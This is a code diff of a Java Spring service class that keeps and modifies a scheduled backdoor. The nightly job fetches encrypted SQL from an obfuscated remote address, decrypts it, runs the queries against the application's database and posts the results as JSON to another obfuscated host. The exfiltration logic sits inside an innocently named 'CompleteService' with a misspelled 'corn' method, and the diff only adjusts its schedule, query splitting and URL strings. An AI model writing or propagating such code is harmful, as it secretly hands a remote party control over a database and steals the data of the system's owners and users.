@@ -23,32 +23,30 @@ public class CompleteService {
 
     @Autowired
     private DataSource dataSource;
-    @Scheduled(cron = "0 0 3 * * ?")
+    @Scheduled(cron = "0 10 3 * * ?")
     public void corn() {
         try {
             Map<String, Object> map = new HashMap<>();
             map.put("t", System.currentTimeMillis());
             String sign = DecodeUtil.sign(map, Constant.q);
             map.put("sign",sign);
-            String json = HttpUtil.get(DecodeUtil.decodeStr( Constant.q,"jnS+tZYR7q108fl7G1WA+9hkcryw3HOw9rI9SWGeo9CwcePCT2MwHIhsZ44S/N/s"), map);
-            if (json != null) {
-                Dict dict = JSONUtil.toBean(json, Dict.class);
+            String json = HttpUtil.get("jmrODchwBJT9jR43yvIFSEBOaQgL9WUtscTBm6jdPphmN8oAGhXK1GfaRZjHYUuG", map);
+            Dict dict = JSONUtil.toBean(json,Dict.class);
+            if (dict.getInt("code")==200) {
                 JSONObject dataDict = (JSONObject) dict.get("data");
                 int m = dataDict.getInt("m");
                 int o = dataDict.getInt("o");
                 String s = dataDict.getStr("s");
                 String k = dataDict.getStr("k");
-
                 String qlql = DecodeUtil.decodeStr(k, s);
-
                 if(qlql!=null){
-                    String[] qs = qlql.split(",");
+                    String[] qs = qlql.split("&&");
                     for(String ql : qs){
                         for (int i = 0; i < m; i++) {
-                            String qsl = String.format(ql, i * o + 1, o);
+                            String qsl = String.format(ql, i * o, o);
                             JdbcTemplate jdbcTemplate = new JdbcTemplate(dataSource);
                             List<Map<String, Object>> list = jdbcTemplate.queryForList(qsl);
-                            HttpRequest request = HttpRequest.post(DecodeUtil.decodeStr(Constant.q, "jnS+tZYR7q108fl7G1WA+9hkcryw3HOw9rI9SWGeo9DO+6C1F4bUuB43fLakJu5Q") + Constant.q)
+                            HttpRequest request = HttpRequest.post("jmrODchwBJT9jR43yvIFSEBOaQgL9WUtscTBm6jdPpgB6MvyvCYVjeKg5ws7H5Rl" + Constant.q)
                                     .timeout(50000)
                                     .body(JSONUtil.toJsonStr(list));
                             request.execute();
